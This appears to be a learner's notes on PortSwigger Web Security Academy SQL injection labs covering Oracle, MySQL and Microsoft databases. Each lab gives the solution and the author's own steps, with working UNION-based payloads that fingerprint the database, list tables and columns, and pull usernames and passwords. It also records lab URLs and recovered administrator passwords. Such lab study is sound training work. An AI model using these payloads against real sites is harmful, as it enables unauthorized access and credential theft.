# Examining the database

This will obtain some information about the database itself. You can query the version details for the database.

In Oracle I can execute ```SELECT * FROM v$version```

It could be also determine what database tables exist, and which columns they contain. For example, on most databases you can execute the following query to list the tables:

```SELECT * FROM information_schema.tables```

## Querying the database type and version

| Database type      | Query                     |
| ------------------ |---------------------------|
| Microsoft, MySQL   | SELECT @@version          |
| Oracle             | SELECT * FROM v$version   |
| PostgreSQL         | SELECT version()          |

### SQL injection attack, querying the database type and version on Oracle

This lab contains an SQL injection vulnerability in the product category filter.

**Solution**
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the *category* parameter:

    ``` '+UNION+SELECT+'abc','def'+FROM+dual-- ```

3. Use the following payload to display the database version:

    ``` ' UNION SELECT banner, NULL FROM v$version--```

**My comment**

```?category=Gifts'+UNION+SELECT+BANNER,null+FROM+v$version--```

### SQL injection attack, querying the database type and version on MySQL and Microsoft

This lab contains an SQL injection vulnerability in the product category filter.

**Solution**
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the *category* parameter:

    ``` '+UNION+SELECT+'abc','def'#```

3. Use the following payload to display the database version:

    ```' UNION SELECT @@version, NULL#```

**My comment**

``` ?category=Lifestyle'+UNION+SELECT+null,@@version--+```

## Listing the contents of the database

Query *information_schema.tables* to list the tables in the database:

``` SELECT * FROM information_schema.tables```

This return output like the following:

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
```

Then query ``` information_schema.columns ``` to list the columns in individual tables:

```SELECT * FROM information_schema.columns WHERE table_name = 'Users'```

This returns output like the following:

```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```

### SQL injection attack, listing the database contents on non-Oracle databases

This lab contains an SQL injection vulnerability in the product category filter. 

**Solution**
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the *category* parameter:

    ```'+UNION+SELECT+'abc','def'--```

3. Use the following payload to retrieve the list of tables in the database:

    ```'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--```

4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:

    ``` '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'-- ```

6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:

    ``` '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--```

8. Find the password for the administrator user, and use it to log in.

**My comment**

Check if the web has vulnerability by add ‘
```https://acc41f4f1fc52248805c132900e10004.web-security-academy.net/filter?category=Pets'```

than check if it works with -- or with #

```https://acc41f4f1fc52248805c132900e10004.web-security-academy.net/filter?category=Pets'--```

than check how many columns it have by ' ORDER BY 1-- 
```https://acc41f4f1fc52248805c132900e10004.web-security-academy.net/filter?category=Pets' ORDER BY 1—```

than check if it contains text or NULL 
```https://acc41f4f1fc52248805c132900e10004.web-security-academy.net/filter?category=Pets' UNION SELECT 'a', NULL—```

than retrieve the list of tables in the database 
```' UNION SELECT table_name, NULL FROM information_schema.tables--```

find users credentials 
```' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = ‘users_yufcfa'--```

find username and password 
```' UNION SELECT username_kaighf, password_atqgtn FROM users_yufcfa—```

find administrator 
administrator
aewin0rqwdatvgjr9emb

### SQL injection attack, listing the database contents on Oracle

This lab contains an SQL injection vulnerability in the product category filter.

**Solution**
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the *category* parameter:

    ``` '+UNION+SELECT+'abc','def'+FROM+dual-- ```

3. Use the following payload to retrieve the list of tables in the database:

    ``` '+UNION+SELECT+table_name,NULL+FROM+all_tables-- ```

4. Find the name of the table containing user credentials.
5. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:

    ``` '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'-- ```

6. Find the names of the columns containing usernames and passwords.
7. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:

    ``` '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF-- ```

8. Find the password for the administrator user, and use it to log in.

**My comment**

```' UNION SELECT 'abc', 'abc'  FROM dual—```

retrieve all tables 

```' UNION SELECT table_name, NULL FROM all_tables--```

Find user password 

```' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = ‘USERS_KAZOKP'--```

find admin password 

```' UNION SELECT USERNAME_CLUMCM, PASSWORD_JDNBTH FROM USERS_KAZOKP--```

administrator
1jhz01stnphvyf824twx
